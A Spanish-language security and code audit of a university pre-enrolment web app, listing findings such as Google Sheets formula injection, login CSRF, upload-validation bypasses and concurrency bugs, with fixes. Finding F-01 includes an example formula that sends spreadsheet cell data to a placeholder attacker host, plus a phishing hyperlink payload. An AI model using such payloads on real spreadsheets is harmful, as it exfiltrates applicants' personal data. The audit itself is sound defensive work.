# Auditoría técnica de `preinscripcionesFLACSOUY`

Fecha: 2026-10-24 · Revisión de código estática + typecheck + tests unitarios.
Alcance: todo `preinscripcionesFLACSOUY` (API Express/TypeScript, web React, contratos, Docker, nginx, deploy, migraciones, tests). De los demás repositorios solo se revisó lo que integra con preinscripciones (ver sección 9).

Convención de evidencia: `ruta:línea` relativa a `preinscripcionesFLACSOUY/`.
Etiquetas: **[CONFIRMADO]** = verificado leyendo el código; **[A VERIFICAR]** = inferido, depende de infraestructura o datos que no tengo.

---

## 0. Resumen ejecutivo

**Estado general.** El proyecto está bien estructurado (puertos/adaptadores, validación con Zod, consultas parametrizadas con Kysely, cola de notificaciones con `FOR UPDATE SKIP LOCKED`, cookies `httpOnly`, CSRF en admin). Typecheck limpio en API y web; 456 tests de API y 92 de web pasan.

**Pero hay 6 problemas que conviene tratar antes de la próxima convocatoria:**

| # | Problema | Efecto |
|---|---|---|
| 1 | Inyección de fórmulas en Google Sheets (F-01) | Un postulante puede ejecutar fórmulas en la planilla del personal |
| 2 | Pérdida de filas por concurrencia en Sheets (F-02) | Dos envíos simultáneos pueden pisarse; se pierde una fila |
| 3 | El worker de Mautic no existe en producción (F-03) | Los contactos nunca se sincronizan; las filas quedan `pending` para siempre |
| 4 | Express 4 con handlers `async` sin `try/catch` (F-04) | Un error de base de datos en un endpoint admin puede tumbar todo el proceso |
| 5 | `nginx` con el límite por defecto de 1 MB (F-05) | Las subidas de documentos > 1 MB probablemente fallan con 413 |
| 6 | Login admin sin `state` ni `nonce` (F-06) | Sin protección de CSRF de login |

Además: la idempotencia de envíos está implementada en el servidor pero **ningún cliente la usa** (F-07), y los documentos obligatorios se pueden omitir omitiendo el campo `files` (F-08).

**Segundo informe incorporado (sección 11).** Un diagnóstico independiente coincide con F-03, F-05, F-06/F-17, F-10 y F-22, y aporta 9 hallazgos nuevos (F-27 a F-35). Verifiqué cada uno contra el código; el más importante es que **producción no envía el token del catálogo a WordPress**, por lo que las coordinaciones de las ofertas nunca recibirían los correos (F-27), y que las redirecciones legacy de WordPress llevan a rutas que la app no reconoce (F-30).

**Tercer informe incorporado (sección 12).** Aporta 14 hallazgos más (F-36 a F-49), de los que el más grave es que **la recuperación administrativa de envíos con documentos falla siempre** (F-36). Además refuté uno de sus puntos críticos: el botón "Quitar" del wizard sí borra el archivo en el servidor.

**Qué NO pude comprobar:** los 31 tests que usan PostgreSQL se saltan sin `PREINSCRIPTIONS_TEST_DATABASE_URL`; no hay ejecución de e2e (Playwright); no revisé el historial de Git en busca de secretos (`git log --all` falla por referencias rotas en `refs/codex/…`, ver F-18).

---

## 1. Método y resultados de las comprobaciones automáticas

| Comprobación | Resultado |
|---|---|
| `tsc --noEmit` API | OK (exit 0) |
| `tsc --noEmit` web | OK (exit 0) |
| `vitest run` API | 58 archivos OK, 8 saltados; 456 tests OK, 31 saltados (todos los de PostgreSQL) |
| `vitest run` web | 22 archivos, 92 tests OK |
| ESLint | **No existe** (el script `lint` es `tsc --noEmit`) |
| CI | **No existe** (`.github/` ausente en este repositorio) |
| `pnpm` | No está en el PATH de la terminal; se ejecutaron `tsc` y `vitest` locales |

Métricas de higiene: 44 usos de `as any`/`: any` en API (no test) y 15 en web; 68 `console.*` en API; 17 tests saltados/condicionados.

---

## 2. Hallazgos de seguridad

### F-01 · ALTO · Inyección de fórmulas en Google Sheets **[CONFIRMADO]**
- `src/infrastructure/google/google-sheets-repository.ts:94` escribe la fila con `valueInputOption=USER_ENTERED`.
- Los valores vienen sin escapar de `buildSpreadsheetValues` (`src/domain/spreadsheet-schema.ts`, rama final `values[column] = normalizedValues[input.key] ?? ''`). No existe ninguna función de escape (búsqueda de `startsWith('=')`/`^[=+` sin resultados).
- Un postulante puede enviar, por ejemplo, `nombre1 = =HYPERLINK("https://sitio-malo","Ver archivo")` o `=IMPORTDATA("https://atacante/?x="&A2)`. Sheets lo evalúa cuando el personal abre la planilla: phishing dentro de la hoja o exfiltración de otras celdas (documentos, correos de otros postulantes).
- **Corrección:** anteponer `'` a cualquier valor de usuario que empiece por `= + - @` (o tab/CR), o escribir con `RAW` y usar `USER_ENTERED` solo para las dos columnas que llevan `=HYPERLINK`. Lo más limpio es escribir el hipervínculo con `RAW` + fórmula explícita en una segunda llamada, o usar `userEnteredValue.formulaValue` por `batchUpdate`.

### F-06 · ALTO · Login de administrador sin `state` ni `nonce` **[CONFIRMADO]**
- El servidor genera `state` y `nonce` y los guarda en `pendingStates` (`src/presentation/http/admin-auth-routes.ts:27,37`), pero **nunca los consulta**: `POST /google` solo pasa el `nonce` que mande el cliente (línea 66).
- El frontend tampoco los usa: `AdminLoginPage.tsx:23` llama `adminLogin(code, redirectUri)` sin `nonce`, y descarta el `state` devuelto.
- Con `expectedNonce` indefinido, la verificación se salta (`src/infrastructure/auth/google-oidc.ts:125`).
- Consecuencia: un atacante puede forzar a un administrador a completar el login con un `code` de otra sesión (login CSRF) y no hay protección de replay.
- Además `pendingStates` crece sin límite ni expiración activa, y `GET /google/url` es público: **fuga de memoria provocable por cualquiera**.
- **Corrección:** guardar `state` en una cookie `httpOnly` firmada o en `pendingStates`, exigirlo y consumirlo en `POST /google`, comparar también el `nonce` guardado (no el del cliente) y purgar expirados.

### F-09 · ALTO · Abuso del sistema como relé de correo y spam de datos **[CONFIRMADO]**
- No hay CAPTCHA, límite de frecuencia ni verificación del correo (`grep` de `rate`/`helmet`/`captcha` en `apps/api/src`: sin resultados).
- Cualquier visitante puede enviar el formulario con el correo de una víctima y texto propio en nombre/apellido: la víctima recibe un correo **desde el dominio de FLACSO** con contenido controlado por el atacante (`src/infrastructure/email/notification-templates.ts`: `Hola ${greetingName}` y la tabla de valores).
- El HTML está bien escapado (no hay XSS), pero el texto sigue siendo ingeniería social con remitente legítimo. También contamina Drive, Sheets, Telegram y Mautic con datos falsos, y consume cuota y reputación del proveedor SMTP.
- Para eludir la cédula uruguaya basta elegir `pasaporte` (solo exige 3–40 caracteres).
- **Corrección:** CAPTCHA (Turnstile/hCaptcha) en el envío, límite por IP y por correo, verificación del correo antes de enviar la confirmación, y no incluir en el correo al postulante campos libres que no sean imprescindibles.

### F-10 · ALTO · Subida de archivos: controles evitables **[CONFIRMADO]**
- `src/presentation/http/upload-routes.ts:82`: toda la validación (campo, MIME, tamaño por documento, máximo de archivos) está dentro de `if (catalog && targetId)`. Si el cliente omite `targetId` se salta, y solo queda la lista global de 4 MIME de `TemporaryFileStorage.save`.
- El tipo es el que **declara** el cliente (`info.mimeType`, línea ~49); no hay verificación de firma (magic bytes). Un ejecutable declarado como `application/pdf` se acepta y se sube a Drive con ese tipo.
- Los límites por sesión dependen de `x-preinscription-session`, que lo elige el cliente: cambiar de valor evade el tope de 25 MiB.
- `src/main.ts:61` crea `TemporaryFileStorage` **sin** `repository`, así que `listBySession` recorre el directorio entero y lee cada `metadata.json` en cada subida (O(n)).
- No hay límite por IP ni limpieza más frecuente que cada 15 minutos → relleno de disco posible.
- **Corrección:** exigir `targetId`; validar firma con `file-type`; límite por IP; usar `PostgresTemporaryUploadRepository` (existe, está sin conectar); limitar subidas totales por ventana.

### F-08 · ALTO · Los documentos obligatorios se omiten si no se envía `files` **[CONFIRMADO]**
- `files` es opcional en el esquema (`submission-routes.ts:77-79`) y `validateSubmission` solo comprueba documentos cuando `providedFileKeys` existe (`src/domain/form-validation.ts:144,159,166,176,182`).
- Un `POST` sin la clave `files` pasa la validación sin título, CV, identidad ni cartas de recomendación. Es una regla de negocio que el servidor no impone.
- **Corrección:** tratar `undefined` como `[]` y exigir los documentos `required` que no sean `canDefer`.

### F-11 · MEDIO-ALTO · Claves arbitrarias en `values` contaminan la base **[CONFIRMADO]**
- `values: z.record(z.string(), …)` acepta cualquier clave y cualquier longitud (`submission-routes.ts:74`; límite global solo de `express.json()` por defecto, 100 kB — `app.ts:75`).
- `postgres-submission-repository.ts:72-83` hace un `INSERT … ON CONFLICT DO NOTHING` en `input_definitions` por **cada clave recibida**, con `label = key`. La tabla es global: un atacante inserta filas ilimitadas.
- Las claves no definidas en el formulario también se guardan en `submission_values`.
- `fechaNacimiento`, `etnia`, `fuente`, `ocupacion`, `estudios`, etc. no tienen validación de formato ni longitud (solo se valida email, teléfono, cédula y algunos enumerados).
- **Corrección:** descartar claves que no estén en `form.inputs`, fijar longitudes máximas, validar fecha y rango de edad, validar `select` contra opciones.

### F-12 · MEDIO · Clave de cifrado débil y placeholder válido **[CONFIRMADO]**
- `src/infrastructure/security/encrypted-settings.ts:15-18`: si la clave no es hex de 64 caracteres se usa `SHA-256(clave)` sin sal ni KDF.
- El valor de ejemplo `REEMPLAZAR_CON_CLAVE_LOCAL_HEX_64_CHARS` de `.env.example` se acepta como clave válida. Si alguien lo deja, los secretos (SMTP, Telegram, Mautic) quedan cifrados con una clave pública.
- Línea 69: un valor sin prefijo `enc:v1:` se devuelve en claro sin avisar.
- **Corrección:** exigir exactamente 64 hex, rechazar el placeholder al arrancar, fallar si el valor no está cifrado.

### F-13 · MEDIO · Infraestructura expuesta y por defecto **[CONFIRMADO]**
- `docker-compose.yml:9,29,68` fija `flacso_password`; publica Postgres (`5433`), API (`3000`) y web (`5173`) en todas las interfaces (líneas 10,36,53). Declara `NODE_ENV: production` aunque parece ser de desarrollo.
- El servicio `notification-worker` no recibe `APP_SETTINGS_ENCRYPTION_KEY` → no puede descifrar la configuración.
- `src/infrastructure/database/kysely.ts` tiene un `DATABASE_URL` por defecto con credenciales incrustadas.
- Los Dockerfiles ejecutan como `root` (no hay `USER node`).
- `deploy/docker-compose.production.yml` está mejor (`expose`, variables obligatorias `:?`, puerto web en `127.0.0.1`).

### F-14 · MEDIO · Sin cabeceras de seguridad ni límites **[CONFIRMADO]**
- `apps/web/nginx.conf` no define CSP, `X-Frame-Options`, `X-Content-Type-Options`, HSTS, ni `X-Forwarded-For/Proto`; la API no usa `helmet` ni configura `trust proxy`, por lo que verá siempre la IP del contenedor nginx (inutiliza cualquier límite por IP futuro).
- `Connection 'upgrade'` fijo sin WebSocket desactiva el keep-alive hacia la API.

### F-15 · MEDIO · Cumplimiento y retención de datos personales **[CONFIRMADO]**
- Solo se purga la recuperación de errores (7 días). `submission_values`, `submission_files`, `email_notifications.payload_json` (copia completa de los datos del postulante) y `profile_snapshot` se conservan indefinidamente.
- `buildMauticContactSync` (`src/domain/mautic-contact.ts`) crea el contacto en Mautic para **todos** los postulantes y no mira `aceptaDifusion`. El comentario del archivo habla de "consentimiento comercial explícito" pero el código no lo comprueba. Conviene revisarlo con quien lleve el cumplimiento de la Ley 18.331.
- No hay un mecanismo de borrado a pedido del titular.

### F-16 · MEDIO · Alcance excesivo de la cuenta de servicio de Google **[CONFIRMADO]**
- `google-credentials.ts` pide los alcances completos `drive` y `spreadsheets` y, con `GOOGLE_SERVICE_ACCOUNT_SUBJECT`, suplanta a `web@flacso.edu.uy` con delegación de dominio. Una fuga de la clave da acceso a todo el Drive de esa cuenta, no solo a la carpeta de preinscripciones.
- **Corrección:** usar una unidad compartida o carpeta compartida con la cuenta de servicio, sin delegación, y el alcance mínimo posible.

### F-17 · BAJO-MEDIO · Autorización de administración **[CONFIRMADO]**
- El correo autorizado está fijo: `ALLOWED_ADMIN_EMAIL` (`src/application/admin-session.ts:26`, usado en `admin-auth-routes.ts:69`). `ADMIN_ALLOWED_EMAILS` y `getAllowedAdminEmails()` se ignoran, aunque `.env.example` y los compose la documentan.
- Todos los administradores comparten `id: 'admin_flacso_web'` (`admin-auth-routes.ts:90`); no hay trazabilidad por persona.
- El 403 devuelve el correo autorizado (línea 73).
- `admin-session.ts:142` compara el token CSRF con `!==`; `POST /logout` no exige CSRF.

### F-18 · BAJO · Otros
- `safeError` divergente: la versión de `submission-routes.ts:17` redacta `?token=`/`Bearer`; la de `src/domain/safe-error.ts` (usada en reintentos) **no redacta nada**, solo recorta a 250 caracteres. Un mensaje de error de Google/SMTP con credenciales puede acabar en BD y en Telegram desde el flujo de reintento.
- `apps/web/src/api/client.ts:25` cae a `Math.random()` si no hay `crypto.randomUUID` (contextos no seguros).
- WordPress publica `urls.edit` (enlace a `wp-admin`) en el catálogo **público** (`class-preinscriptions-serializer.php:167,261`); solo los correos son privados (`class-preinscriptions-rest.php:14`).
- El token del portal viaja como `Bearer` sin exigir `https://` en `WORDPRESS_URL`.
- `.secrets/ses-smtp-preinscripciones-20261004_credentials.csv` está en el árbol de trabajo (no rastreado por Git, correcto). Como SES ya no se usa, conviene revocar esas credenciales y borrar el archivo. `backups/*.sql.gz` también está en disco (ignorado por Git).
- Confirmé que Git **no rastrea** `.env`, `.secrets/` ni `backups/` (`git ls-files`). No pude revisar el historial completo porque `git log --all` aborta por referencias rotas (`refs/codex/turn-diffs/…`); conviene limpiarlas y correr una herramienta como `gitleaks` sobre el historial.

---

## 3. Errores funcionales e inconsistencias

### F-02 · ALTO · Carrera de escritura en Sheets: se pierden filas **[CONFIRMADO]**
- `google-sheets-repository.ts:91-94`: inserta una fila en la posición 2 y después escribe en `A2:…2`. Son dos llamadas no atómicas y sin bloqueo.
- Dos envíos concurrentes: ambos insertan, ambos escriben en la fila 2 → el segundo pisa al primero; queda una fila vacía.
- Además, el enlace a la fila que se manda en correos y Telegram (`sheets-client.ts:32`, `range=A2:…2`) deja de apuntar a esa persona en cuanto entra el siguiente envío.
- **Corrección:** usar `values:append` (ya existe `appendValues`, `sheets-client.ts`, sin uso) con `INSERT_ROWS`, tomar `updatedRange` de la respuesta y construir el enlace con la fila real; o poner el orden descendente como vista, no como inserción.

### F-03 · ALTO · El worker de Mautic no corre en producción **[CONFIRMADO]**
- `MauticContactSyncDispatcher` solo se instancia en `src/worker-notifications.ts:77`. `main.ts` no lo arranca.
- `deploy/docker-compose.production.yml` no define ningún servicio `worker` (solo `postgres`, `api`, `web`).
- Resultado: las filas de `mautic_contact_sync` se acumulan en `pending` indefinidamente con los datos personales en `payload_json`. En el compose de desarrollo, el worker existe pero sin la clave de cifrado (F-13), así que tampoco funciona.
- **Corrección:** arrancar el dispatcher en `main.ts` (como los de correo/Telegram) o añadir el servicio worker al compose de producción con `APP_SETTINGS_ENCRYPTION_KEY`.

### F-04 · ALTO · Un error async tumba el proceso **[CONFIRMADO]**
- Express es `4.22.3` (`apps/api/package.json`), que **no** captura rechazos de handlers `async`. Node ≥ 15 termina el proceso ante un `unhandledRejection`.
- `admin-settings-routes.ts` tiene 25 `async (` y 20 `try {`; `admin-auth-routes.ts:47,134,164` y `requireAdmin` (`admin-session.ts:111`) no tienen `try/catch`.
- No existe `process.on('unhandledRejection')` ni `pool.on('error')` (`kysely.ts:15`) en el API. Un corte de Postgres durante una petición admin, o un error de conexión inactiva del pool, mata el servidor y corta los envíos en curso.
- `@types/express` es `^5` mientras el runtime es 4, lo que oculta el problema en tiempo de compilación.
- **Corrección:** actualizar a Express 5 (reenvía errores async) o envolver con un `asyncHandler`; añadir handlers de `unhandledRejection` y `pool.on('error')`; alinear `@types/express`.

### F-05 · ALTO · Subidas > 1 MB probablemente fallan **[CONFIRMADO en configuración / A VERIFICAR en el servidor]**
- `apps/web/nginx.conf` no define `client_max_body_size`; el valor por defecto de nginx es 1 MB. La API admite 10 MiB por archivo y 25 MiB por envío.
- Los e2e usan el proxy de Vite, así que no lo detectan. Un PDF típico de CV o título supera 1 MB.
- **Corrección:** `client_max_body_size 30m;` y ajustar timeouts (`proxy_read_timeout`) para envíos largos.

### F-07 · ALTO · La idempotencia existe pero no se usa, y el servidor la ignora **[CONFIRMADO]**
- El cliente no envía `clientSubmissionId` (`apps/web/src/api/client.ts:97`).
- Aunque lo enviara, `saveOrGet` devuelve `existing: true` (`postgres-submission-repository.ts:28`) y `submitPreinscription` descarta ese dato (`submit-preinscription.ts:162-190`): la ruta volvería a subir a Drive, a añadir otra fila y a encolar otra vez correos y Telegram.
- Un doble clic, un reintento de red o un proxy que reenvía produce duplicados (hoy, además, sin posibilidad de detectarlos).
- La columna es `varchar(128)` (migración 010) pero Zod no limita la longitud → 500 con IDs largos.
- **Corrección:** generar un UUID por intento en el cliente, devolverlo en la respuesta, y si `existing` es true devolver el resultado previo sin repetir efectos.

### F-19 · MEDIO · Reintentos de recuperación **[CONFIRMADO]**
- `retry-failed-submission.ts:181`: `const form = composition.ok ? composition.value : (target as any)`. Si la composición falla, `buildSpreadsheetSchema(target)` revienta (`form.inputs` no existe) y se informa como `SHEETS_ERROR` con un mensaje confuso.
- Si falla `getCanonicalFormDefinition` por catálogo, el error de WordPress se registra con etapa `'sheets'` (mal etiquetado).
- `leaseDurationMs` por defecto es 60 s (línea 74); una subida de varios archivos a Drive puede durar más → otro operador reclama el caso y se duplican filas y archivos.
- Reintentar tras un fallo posterior a la escritura en Sheets vuelve a añadir la fila (no hay búsqueda por ID de seguimiento).
- Las notificaciones de Telegram del reintento no pasan `catalogValidation`.

### F-20 · MEDIO-ALTO · Migración de planillas puede destruir hipervínculos y alterar datos **[CONFIRMADO en código / A VERIFICAR si ya se ejecutó]**
- `getValues` (`sheets-client.ts:110`) no indica `valueRenderOption`, por lo que devuelve el valor **formateado** ("Ver archivo"), no la fórmula. `collapseLegacySpreadsheetRow` espera `=HYPERLINK(` (`spreadsheet-schema.ts`, última rama) que nunca llega.
- `synchronizeSchema` reescribe toda la hoja con `USER_ENTERED` (`google-sheets-repository.ts:156`): los enlaces a Drive pasan a ser texto plano. Y cualquier envío concurrente durante la migración se pierde.

### F-21 · MEDIO · `USER_ENTERED` altera los datos legítimos **[CONFIRMADO]**
- El celular normalizado a E.164 (`+59899123456`) se interpreta como número y pierde el `+`; documentos con ceros a la izquierda o separadores, y fechas, pueden reinterpretarse. Es el mismo problema de F-01 visto desde la fidelidad de datos.
- `formatDriveFolderHyperlink` usa `;` como separador (`=HYPERLINK("…"; "…")`), válido solo si la configuración regional de la planilla lo espera. **[A VERIFICAR]** que la API de Sheets lo acepta igual en todos los locales.

### F-22 · MEDIO · Resiliencia inconsistente ante WordPress caído **[CONFIRMADO]**
- El envío tolera WordPress caído usando el catálogo guardado (`submit-preinscription.ts`), pero `upload-routes.ts:83` llama `revalidateTarget`, que lanza → `500` en la subida. El postulante puede completar el formulario pero no adjuntar documentos.
- `getTargetForm` (`get-target-form.ts:35`) y cada subida/envío fuerzan una consulta fresca a WordPress (`revalidateTargets`), sin límite de frecuencia: cada visita al formulario es una petición a WordPress (amortiguada por su caché de 60 s, `class-preinscriptions-cache.php`).
- `listCachedTargets` acepta hasta 6 h de antigüedad (`submit-preinscription.ts:13`): se pueden aceptar preinscripciones de convocatorias recién cerradas. El diseño lo marca con `catalog_validation='cached'` y avisa por Telegram; asegurarse de que alguien lo lea.
- `getAgreements` usa `per_page=100` sin paginar (`wordpress-client.ts:195`): a partir de 101 convenios se pierden en silencio.

### F-23 · MEDIO · Drive y concurrencia
- `ensureChildFolder` (`google-drive-repository.ts:188`) es listar-y-crear sin bloqueo → carpetas duplicadas con envíos simultáneos al mismo destino nuevo.
- `TargetSpreadsheetService.locks` es un `Map` en memoria del proceso; con más de una instancia puede crearse más de una planilla y luego `findSpreadsheetByTargetId` lanza "Inconsistencia" y bloquea los envíos de ese destino.
- Timeout de 15 s (`google-drive-repository.ts:49`) para subir hasta 10 MB: puede fallar en conexiones lentas.
- Cada envío hace descubrimiento de planilla + 3 búsquedas de carpetas + metadatos antes de escribir (≈ 8–12 llamadas a Google en serie), todo dentro de la petición HTTP del postulante.

### F-24 · MEDIO · Migraciones sin control de versiones **[CONFIRMADO]**
- `migrate.ts` ejecuta todas las `up()` en cada arranque, sin tabla de control ni bloqueo asesor; depende de que todas sean idempotentes. Hay saltos de numeración (018, 020) y un `.test.ts` dentro de `migrations/`.
- `main.ts:152` traga el error de migración con `console.warn` y arranca igual.
- La 011 transforma datos de perfiles legacy en cada arranque.

### F-25 · BAJO-MEDIO · Dos dispatchers sobre la misma cola, con criterios distintos
- `main.ts:165` resuelve el proveedor de correo sin excluir `'fake'`; el worker sí (`worker-notifications.ts:43`). Si algún entorno de producción quedara con `provider=fake`, la API marcaría los correos como enviados sin enviar nada.
- Telegram: la API despacha con `enabled || preinscriptionEnabled`; el worker solo con `enabled`.
- La cola usa `SKIP LOCKED` y arrendamiento (correcto); si un proceso cae entre enviar y `markSent`, el correo se reenvía (entrega al-menos-una-vez).

### F-26 · BAJO · Otros
- Lógica de validación del servidor y del cliente divergente: el cliente aplica reglas de `alternative.kind==='defer'`; el servidor solo `canDefer`. Hoy los formularios canónicos no usan "diferir", pero el desfase queda latente.
- El wizard no persiste el estado: recargar la página pierde todo (los archivos ya subidos quedan huérfanos hasta que expiran).
- `profile_snapshot` guarda el formulario completo (con la lista de convenios) en cada envío: crecimiento innecesario de la tabla.
- `wordpress-cache.ts` traga cualquier error de base de datos con `catch { return null }`.

---

## 4. Código duplicado

| Qué | Dónde | Sugerencia |
|---|---|---|
| Bloque de fallo "registrar + extender retención + alertar + responder 202" (×3 en la ruta y ×4 en reintento) | `submission-routes.ts:240-278, 286-320, 353-388`; `retry-failed-submission.ts` | Extraer `recordProcessingFailure(stage, error)` |
| `sanitizeSafeError` (dos versiones distintas) | `submission-routes.ts:17` y `domain/safe-error.ts` | Unificar en una y que redacte secretos |
| Resolver chat IDs de Telegram con el mismo `try/catch` (×4) | `app.ts:137-198` | Un helper `resolveTelegramChatIds(kind)` |
| Obtener el ID de sesión de la cookie (×3) | `admin-auth-routes.ts:135,165`; `admin-session.ts:96` | Exportar `extractSessionId` |
| Opciones de cookie (×4) | `admin-auth-routes.ts` | Constante `sessionCookieOptions()` |
| Constantes `7` días de retención y `7*24*60*60*1000` | rutas y servicios | `RECOVERY_RETENTION_DAYS` |
| Lista de claves por paso en el wizard (dos veces en el mismo archivo) | `PreinscriptionWizard.tsx` (`validateStep` y `currentStepInputs`) | Derivar de `input.stepId` o de una función compartida |
| Construcción de dispatchers y limpieza | `main.ts` y `worker-notifications.ts` | Módulo `bootstrap-workers.ts` |
| Tres nombres para la misma función | `dispatchBatch`, `processPendingBatch`, `dispatchPending` (`email-notification-dispatcher.ts`) | Dejar uno |
| Backoff de reintentos de correo | `calculateBackoffMs` y `calculateNextAttemptTime` | Dejar uno |
| Dos fuentes de verdad para los campos | `CANONICAL_BASE_INPUTS` (contratos) vs `UNIVERSAL_INPUTS`/`SUPPORTED_SPECIFIC_INPUTS` (`domain/form-definition.ts`), aún usadas por `postgres-submission-repository.ts` para etiquetar `input_definitions` | Usar solo el canónico |
| `mauticSlug` en TS y `FLACSO_Inquiry_Tag_Factory::slug` en PHP | `domain/mautic-contact.ts` / plugin WordPress | Hoy son equivalentes; añadir un test de contrato con casos compartidos |
| Esquema Zod del catálogo (TS) y serializador (PHP) | `wordpress-client.ts` / `class-preinscriptions-serializer.php` | Ya hay fixture compartido; mantenerlo |

---

## 5. Código muerto o sin uso

Detectado por referencias; cada ítem fue contrastado por búsqueda. Verificar antes de borrar.

**Backend**
- Sistema de **perfiles de formulario** completo, reemplazado por los formularios canónicos: `domain/form-profiles.ts` (318 líneas), `domain/form-composition.ts` (`composeForm`), partes de `domain/form-definition.ts`, `PostgresFormProfileRepository`, `MemoryFormProfileRepository`, `createAdminProfileRoutes` (no se monta en `app.ts`), tablas `form_profiles`, `form_profile_versions`, `form_profile_audit_events` y la migración 011.
- **SES**: `infrastructure/email/ses-client.ts`, `SesEmailProvider`, las constantes `SETTING_SES_*` y la dependencia `@aws-sdk/client-sesv2` (pesada) no se usan. Revocar además las credenciales del CSV de `.secrets/`.
- `getAllowedAdminEmails` (ver F-17), `startNotificationSupervisor`, `calculateNextAttemptTime`, `renderAllNotifications`, `maskString`, `smtpSettingsRequireReverification`, `ALL_SUPPORTED_INPUT_KEYS`.
- `PostgresTemporaryUploadRepository` (existe y está testeada, pero `main.ts` no la conecta; ver F-10).
- `appendValues` en `sheets-client.ts` (es justo lo que resolvería F-02).
- Tablas sin ninguna referencia en el código: `target_inputs`, `orientations`, `mentions`, `orientation_mentions`, `spreadsheet_operations`.
- `try { … } catch (err) { throw err; }` inútil en `wordpress-academic-catalog.ts:69`.

**Frontend**
- `components/ProfileVersionEditor.tsx` no lo importa nadie.
- `apiClient.listAdminProfiles/getAdminProfile/createProfileVersion/activateProfileVersion` llaman a `/api/admin/profiles…`, que **el backend no monta**: devolverían 404. `AdminProfilesPage` solo muestra las tarjetas de configuración; el nombre es engañoso.

**Repositorio**
- `docs/superpowers/` (≈ 570 KB de planes y especificaciones) y `.superpowers/` son artefactos de proceso, no documentación de uso; considerar moverlos fuera del repositorio o archivarlos.

---

## 6. Fragilidad (resumen por área)

- **Orquestación síncrona.** Subida a Drive, Sheets, correos y Telegram ocurren dentro de la petición HTTP del postulante; si algo tarda, el usuario espera y puede reenviar (F-07). Una cola con trabajador (ya hay patrón en correo/Telegram/Mautic) sería más robusta: guardar el envío y procesar Drive/Sheets en segundo plano.
- **Dependencia de nombres de columnas.** `appendByHeaders` busca encabezados por texto; renombrar una etiqueta en el formulario cambia el encabezado esperado y fuerza reparación aditiva ("reparar" añade columnas nuevas al final sin avisar).
- **Reglas con claves literales.** `form-validation.ts` y el wizard conocen `titulo`, `cartaRecomendacion1/2`, `sinTituloActual`, `posgradoFlacso`… Añadir un documento o campo nuevo exige tocar cuatro sitios (contratos, validación, wizard, esquema de planilla).
- **Un solo proceso, estado en memoria.** Locks de planillas, caché de agreements y la intención de `pendingStates` son por proceso. Escalar a 2 réplicas rompe supuestos.
- **Sin apagado ordenado** en `main.ts` (solo el worker maneja `SIGTERM`); un `docker stop` corta peticiones en vuelo.
- **Tests de integración no ejecutados.** Todo lo que depende de PostgreSQL real (`claim`, idempotencia, sesiones, recuperación) está saltado por defecto. No hay CI que los active.
- **Pool de `pg` con `max: 10`** compartido con trabajadores internos (correo, Telegram, limpieza); revisar bajo carga.

---

## 7. Integraciones revisadas

| Integración | Estado |
|---|---|
| **WordPress → portal** (`/wp-json/flacso/v1/preinscripciones`) | Bien diseñado: contrato `v1` validado por objeto (un destino inválido no tira el catálogo), token con `hash_equals` y longitud mínima 32, `Vary: Authorization`, caché de 60 s con invalidación por hooks, correos solo para el portal. Observaciones: F-18 (`urls.edit` público), F-22 (frecuencia de consultas, `per_page=100`). |
| **Portal → Mautic (contactos)** | Cliente OAuth2 correcto (reintenta 401, clasifica errores, confirma email exacto tras la búsqueda). Bloqueado por F-03; consentimiento en F-15. |
| **Portal → Mautic (correo)** | `MauticEmailProvider` con clasificación `unknown` para evitar doble envío. Sin hallazgos. |
| **Plugin Mautic de WordPress** | Lee `preinscripcion.url`/`link_preinscripcion` del contrato de WordPress; sin hallazgos propios. `mauticSlug` duplicado (sección 4). |
| **Tema Kadence** | Usa `link_preinscripcion` y cae a `https://preinscripciones.flacso.edu.uy/` si falta. Contiene `.worktrees/homepage-build/` con una copia del tema dentro del repositorio (duplicación de código ajena a esta revisión). |
| **Google Drive/Sheets** | F-01, F-02, F-16, F-20, F-21, F-23. |
| **Telegram** | Texto plano (sin `parse_mode`): no hay inyección de formato. Token con regex y errores saneados. Bien. |
| **SMTP** | Plantillas con `escapeHtml` correcto. Contraseña cifrada en reposo y nunca devuelta (`hasPassword`). Bien. |

---

## 8. Lo que está bien hecho

- Cookies de sesión `httpOnly` + `sameSite=lax` + `secure` en producción; token CSRF por sesión; todas las rutas de `/api/admin/settings` bajo `router.use(requireAdmin)`.
- Tokens de archivo temporal: 128 bits aleatorios, validados con regex antes de resolver rutas (sin path traversal), permisos `0700/0600`.
- Cifrado AES-256-GCM con IV aleatorio por valor; los secretos nunca se devuelven al navegador.
- Consultas con Kysely parametrizado; no hay SQL concatenado con entrada de usuario.
- Cola de correo, Telegram y Mautic con `FOR UPDATE SKIP LOCKED`, arrendamientos y reintentos con backoff.
- Validación de cédula uruguaya con dígito verificador y teléfono con `libphonenumber-js`.
- Resolución de enlaces de preinscripción (`resolvePermalinks`) como única regla compartida entre catálogo, formulario y envío.
- Sin `dangerouslySetInnerHTML`/`innerHTML`/`eval` en el frontend; HTML de correos escapado.
- Estrategia de despliegue con respaldo previo de BD y `--check`/`--dry-run`.

---

## 9. Límites de esta revisión

No revisé a fondo: `google-spreadsheet-provisioner.ts`, `postgres-submission-recovery-repository.ts`, `postgres-telegram-alert-repository.ts`, `smtp-email-provider.ts`, `mautic-email-provider.ts`, `email-config.ts` (a partir de la línea 80), `telegram-config.ts`, `scripts/migrate-spreadsheets.ts`, los componentes de UI de formularios (`FormStep`, `DynamicForm`, `DocumentUploadFields`, etc.) ni los tests e2e. No hay análisis de vulnerabilidades de dependencias (`pnpm audit`) por no disponer de `pnpm`. No audité los repositorios `flacso-formularios` (Django), `kadence-child-flacso`, ni el resto del plugin de WordPress más allá del módulo `preinscripciones`.

---

## 10. Plan de remediación sugerido

**Fase 1 — antes de la próxima convocatoria (impacto alto, esfuerzo bajo/medio)**
1. F-01 escapar fórmulas · F-02 usar `append` · F-04 `asyncHandler` + handlers de proceso/pool · F-05 `client_max_body_size`.
2. F-03 arrancar el dispatcher de Mautic en producción.
3. F-08 y F-11 endurecer la validación del servidor (documentos obligatorios, claves permitidas, longitudes).
4. F-07 `clientSubmissionId` en el cliente y corte de efectos en el servidor.
5. F-06 validar `state`/`nonce`.

**Fase 2 — hardening (1–2 semanas)**
6. F-09 CAPTCHA + límites; F-10 firma de archivos y `targetId` obligatorio; F-12 exigir clave hex de 64; F-14 cabeceras (`helmet`, nginx); F-17 usar `ADMIN_ALLOWED_EMAILS` y un `id` por usuario.
7. F-19 corregir reintentos; F-22 coherencia ante WordPress caído; F-24 tabla de migraciones con bloqueo.
8. CI (typecheck + tests + PostgreSQL de prueba) y ESLint con `no-floating-promises`.

**Fase 3 — deuda técnica**
